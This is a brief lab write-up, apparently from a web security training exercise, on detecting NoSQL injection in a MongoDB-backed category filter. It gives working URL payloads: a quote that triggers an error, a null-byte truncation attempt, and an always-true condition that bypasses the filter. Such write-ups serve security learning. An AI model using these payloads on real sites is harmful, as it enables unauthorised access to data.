# Detecting NoSQL injection
First, I just injected ' to see if it would throw an error. it did.
`[...]/filter?category=Clothing%2c+shoes+and+accessories%27`
Then I tried adding a null byte like this to make MongoDB ignore the rest in case the prompt looked like
`this.category == 'xxxxx' && this.released == 1`
`[...]/filter?category=Clothing%2c+shoes+and+accessories%27%00`

That didn't do anything. Then I tried this:
`/filter?category=Clothing%2c+shoes+and+accessories%27%20||%20%271%27%20==%20%271`
Which always would evaluate to true. It solved the lab.